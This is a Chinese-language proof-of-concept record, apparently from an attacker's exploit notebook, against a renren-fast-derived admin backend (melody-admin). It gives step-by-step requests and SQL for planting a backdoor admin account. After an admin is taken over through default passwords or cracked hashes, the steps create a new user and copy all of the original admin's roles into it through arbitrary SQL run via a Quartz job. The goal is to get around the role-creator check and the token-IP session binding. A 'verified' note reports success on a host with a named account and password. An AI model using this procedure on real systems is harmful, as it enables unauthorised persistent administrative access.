# renren-fast 派生后台：SQL 复制角色绕过角色创建者校验 + 自建管理员规避 token IP 互踢

- **code**: renren-fast-派生后台-sql-复制角色绕过角色创建者校验-自建管理员规避-token-ip-互踢
- **kind**: poc
- **category**: auth-bypass
- **component**: renren-fast / melody-admin
- **source**: self
- **verified**: 1
- **verified_note**: example.com：artxdm8/Artx@2026（userId=900562）创建成功，sys_user_role 147→169 行，登录后 /admin/aiplan/plan/getByPage、/sys/schedule/list 均 code 0 返回真实数据，连续多次请求不再触发 IP 10008。
- **created_at**: 2026-10-19T20:24:00.841Z

## 描述

默认口令/哈希还原拿到任一管理员后，多 worker 共用该账号会因服务端「token 与账号最后登录 IP 绑定」互相踢下线（code 10008）。解决：用该管理员 POST /sys/user/save（roleIdList=[]）创建专属账号；roleIdList 非空会报「新增用户所选角色，不是本人创建」，改为经任意 SQL 原语（Quartz jdbcTemplate.execute）执行 INSERT INTO sys_user_role(user_id,role_id) SELECT <新uid>,role_id FROM sys_user_role WHERE user_id=<原uid>，把原管理员全部角色复制给新账号，重新登录即拥有同等后台权限且不再被踢。

## 用法

```
1) 登录原管理员拿 token；2) POST /melody-admin/sys/user/save {"username":"<new>","password":"<pwd>","checkPassword":"<pwd>","email":"","mobile":"","timesLimit":0,"dailyLimit":0,"withdrawLimit":0,"dailyWithdrawLimit":0,"memberQueryScope":0,"status":1,"roleIdList":[]}；3) SELECT user_id FROM sys_user WHERE username='<new>' 取新 uid；4) 经任意 SQL 执行 INSERT INTO sys_user_role(user_id,role_id) SELECT <new_uid>,role_id FROM sys_user_role WHERE user_id=<orig_uid>；5) 用新账号登录。
```
